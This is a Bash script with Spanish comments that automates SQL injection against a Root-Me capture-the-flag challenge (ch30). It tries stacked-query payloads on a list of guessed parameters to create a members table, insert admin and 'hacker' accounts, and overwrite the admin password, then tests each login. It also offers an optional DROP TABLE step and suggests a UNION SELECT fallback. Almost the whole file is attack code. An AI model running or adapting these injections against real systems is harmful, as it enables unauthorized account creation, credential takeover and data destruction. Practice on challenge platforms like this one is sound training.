#!/bin/bash

# ================================================
# CREAR TABLA MEMBRES EXACTA - CH30
# Script completo con verificación en todos los puntos
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  CREAR TABLA MEMBRES EXACTA - CH30${NC}"
echo -e "${BLUE}========================================${NC}"

# ============================================
# PUNTOS DE INYECCIÓN A PROBAR
# ============================================

INJECTION_POINTS=(
    "action=membres&id=1'"
    "action=membres&id=2'"
    "action=membres&id=3'"
    "action=membres&id=1' OR 1=1"
    "action=membres&id=1' AND 1=1"
    "action=membres'"
    "action=login'"
    "id=1'"
    "page=1'"
    "section=1'"
)

# ============================================
# VARIABLES DE CONTROL
# ============================================

FOUND=0
SUCCESS=0

# ============================================
# FUNCIÓN PARA PROBAR OPERACIONES
# ============================================

test_operation() {
    local point=$1
    local operation=$2
    local desc=$3
    
    echo -e "\n${BLUE}[*] Probando: $desc${NC}"
    echo -e "    ${YELLOW}Punto: $point${NC}"
    echo -e "    ${YELLOW}Operación: $operation${NC}"
    
    # Ejecutar la operación
    response=$(curl -s "$URL?$point; $operation" 2>/dev/null)
    
    # Verificar si hubo error
    if echo "$response" | grep -qiE "error|warning|syntax|duplicate|exists|denied|access denied"; then
        echo -e "    ${RED}❌ ERROR:${NC}"
        echo "$response" | grep -iE "error|warning|syntax|duplicate|exists|denied|access denied" | head -3
        return 1
    else
        echo -e "    ${GREEN}✅ Posible éxito (sin errores visibles)${NC}"
        return 0
    fi
}

# ============================================
# PASO 1: CREAR TABLA EXACTA
# ============================================

echo -e "\n${YELLOW}========================================${NC}"
echo -e "${YELLOW}  PASO 1: CREAR TABLA MEMBRES${NC}"
echo -e "${YELLOW}========================================${NC}"

CREATE_TABLE="CREATE TABLE IF NOT EXISTS \`membres\` (
  \`id\` int(1) NOT NULL AUTO_INCREMENT,
  \`username\` VARCHAR(5) NOT NULL,
  \`pass\` VARCHAR(20) NOT NULL,
  \`email\` VARCHAR(50) NOT NULL,
  PRIMARY KEY (\`id\`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 AUTO_INCREMENT=2"

for point in "${INJECTION_POINTS[@]}"; do
    if test_operation "$point" "$CREATE_TABLE" "Crear tabla membres"; then
        FOUND=$((FOUND + 1))
        echo -e "    ${GREEN}✅ Tabla creada en: $point${NC}"
        
        # Verificar si la tabla se creó
        verify=$(curl -s "$URL?$point AND (SELECT COUNT(*) FROM membres)>=0" 2>/dev/null)
        if echo "$verify" | grep -qiE "error|warning"; then
            echo -e "    ${RED}❌ Verificación fallida: la tabla no existe${NC}"
        else
            echo -e "    ${GREEN}✅ Verificación exitosa: la tabla existe${NC}"
            SUCCESS=$((SUCCESS + 1))
        fi
    fi
done

# ============================================
# PASO 2: INSERTAR USUARIO ADMIN
# ============================================

echo -e "\n${YELLOW}========================================${NC}"
echo -e "${YELLOW}  PASO 2: INSERTAR USUARIO ADMIN${NC}"
echo -e "${YELLOW}========================================${NC}"

INSERT_USER="INSERT INTO \`membres\` (\`id\`, \`username\`, \`pass\`, \`email\`) VALUES (1, 'admin', 'password123', 'admin@test.com')"

for point in "${INJECTION_POINTS[@]}"; do
    if test_operation "$point" "$INSERT_USER" "Insertar usuario admin"; then
        FOUND=$((FOUND + 1))
        echo -e "    ${GREEN}✅ Usuario admin insertado en: $point${NC}"
        
        # Verificar autenticación
        echo -e "    ${YELLOW}[!] Probando autenticación con admin/password123...${NC}"
        auth=$(curl -s -X POST "$URL" -d "username=admin&password=password123" | grep -c "login failed")
        if [ "$auth" -eq 0 ]; then
            echo -e "    ${GREEN}✅ ¡AUTENTICACIÓN EXITOSA!${NC}"
            echo -e "${GREEN}========================================${NC}"
            echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
            echo -e "${GREEN}  Punto de inyección: $point${NC}"
            echo -e "${GREEN}  Usuario: admin${NC}"
            echo -e "${GREEN}  Contraseña: password123${NC}"
            echo -e "${GREEN}========================================${NC}"
            exit 0
        else
            echo -e "    ${RED}❌ Autenticación fallida${NC}"
        fi
    fi
done

# ============================================
# PASO 3: INSERTAR USUARIO HACKER
# ============================================

echo -e "\n${YELLOW}========================================${NC}"
echo -e "${YELLOW}  PASO 3: INSERTAR USUARIO HACKER${NC}"
echo -e "${YELLOW}========================================${NC}"

INSERT_HACKER="INSERT INTO \`membres\` (\`id\`, \`username\`, \`pass\`, \`email\`) VALUES (2, 'hacker', 'hack123', 'hacker@test.com')"

for point in "${INJECTION_POINTS[@]}"; do
    if test_operation "$point" "$INSERT_HACKER" "Insertar usuario hacker"; then
        FOUND=$((FOUND + 1))
        echo -e "    ${GREEN}✅ Usuario hacker insertado en: $point${NC}"
        
        # Verificar autenticación
        echo -e "    ${YELLOW}[!] Probando autenticación con hacker/hack123...${NC}"
        auth=$(curl -s -X POST "$URL" -d "username=hacker&password=hack123" | grep -c "login failed")
        if [ "$auth" -eq 0 ]; then
            echo -e "    ${GREEN}✅ ¡AUTENTICACIÓN EXITOSA!${NC}"
            echo -e "${GREEN}========================================${NC}"
            echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
            echo -e "${GREEN}  Punto de inyección: $point${NC}"
            echo -e "${GREEN}  Usuario: hacker${NC}"
            echo -e "${GREEN}  Contraseña: hack123${NC}"
            echo -e "${GREEN}========================================${NC}"
            exit 0
        else
            echo -e "    ${RED}❌ Autenticación fallida${NC}"
        fi
    fi
done

# ============================================
# PASO 4: ACTUALIZAR CONTRASEÑA DEL ADMIN
# ============================================

echo -e "\n${YELLOW}========================================${NC}"
echo -e "${YELLOW}  PASO 4: ACTUALIZAR CONTRASEÑA DEL ADMIN${NC}"
echo -e "${YELLOW}========================================${NC}"

UPDATE_PASS="UPDATE \`membres\` SET \`pass\`='admin123' WHERE \`username\`='admin'"

for point in "${INJECTION_POINTS[@]}"; do
    if test_operation "$point" "$UPDATE_PASS" "Actualizar contraseña del admin"; then
        FOUND=$((FOUND + 1))
        echo -e "    ${GREEN}✅ Contraseña actualizada en: $point${NC}"
        
        # Verificar autenticación
        echo -e "    ${YELLOW}[!] Probando autenticación con admin/admin123...${NC}"
        auth=$(curl -s -X POST "$URL" -d "username=admin&password=admin123" | grep -c "login failed")
        if [ "$auth" -eq 0 ]; then
            echo -e "    ${GREEN}✅ ¡AUTENTICACIÓN EXITOSA!${NC}"
            echo -e "${GREEN}========================================${NC}"
            echo -e "${GREEN}  ¡DESAFÍO COMPLETADO!${NC}"
            echo -e "${GREEN}  Punto de inyección: $point${NC}"
            echo -e "${GREEN}  Usuario: admin${NC}"
            echo -e "${GREEN}  Contraseña: admin123${NC}"
            echo -e "${GREEN}========================================${NC}"
            exit 0
        else
            echo -e "    ${RED}❌ Autenticación fallida${NC}"
        fi
    fi
done

# ============================================
# PASO 5: DROP TABLE (PELIGROSO - USAR CON CUIDADO)
# ============================================

echo -e "\n${YELLOW}========================================${NC}"
echo -e "${YELLOW}  PASO 5: DROP TABLE (PELIGROSO)${NC}"
echo -e "${RED}  ESTO ELIMINARÁ LA TABLA SI EXISTE${NC}"
echo -e "${YELLOW}========================================${NC}"

echo -e "${RED}[!] ¿Quieres probar DROP TABLE? (s/N)${NC}"
read -r answer
if [[ "$answer" =~ ^[Ss]$ ]]; then
    DROP_TABLE="DROP TABLE IF EXISTS \`membres\`"
    
    for point in "${INJECTION_POINTS[@]}"; do
        if test_operation "$point" "$DROP_TABLE" "Eliminar tabla membres"; then
            FOUND=$((FOUND + 1))
            echo -e "    ${RED}⚠️  Tabla eliminada en: $point${NC}"
        fi
    done
fi

# ============================================
# RESUMEN FINAL
# ============================================

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  RESUMEN FINAL${NC}"
echo -e "${BLUE}========================================${NC}"

echo -e "\n${YELLOW}[+] Puntos de inyección probados: ${#INJECTION_POINTS[@]}${NC}"
echo -e "${YELLOW}[+] Operaciones exitosas (sin errores): $FOUND${NC}"
echo -e "${GREEN}[+] ¡DESAFÍO COMPLETADO! $SUCCESS${NC}"

if [ $SUCCESS -eq 0 ]; then
    echo -e "\n${RED}========================================${NC}"
    echo -e "${RED}  NO SE PUDO COMPLETAR EL DESAFÍO${NC}"
    echo -e "${RED}========================================${NC}"
    
    echo -e "\n${YELLOW}[!] Posibles explicaciones:${NC}"
    echo -e "  1. El usuario de la base de datos no tiene permisos de escritura"
    echo -e "  2. Las consultas múltiples (stacked queries) están deshabilitadas"
    echo -e "  3. El filtro bloquea palabras clave como CREATE, INSERT, UPDATE"
    echo -e "  4. La inyección solo permite SELECT (UNION SELECT)"
    echo -e "  5. La tabla ya existe con una estructura diferente"
    
    echo -e "\n${YELLOW}[!] Prueba a crear la tabla con UNION SELECT:${NC}"
    echo -e "    curl -s \"$URL?action=membres&id=1' UNION SELECT 1,'admin','password123',4 FROM membres WHERE 1=2#\""
fi

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN DEL SCRIPT${NC}"
echo -e "${BLUE}========================================${NC}"
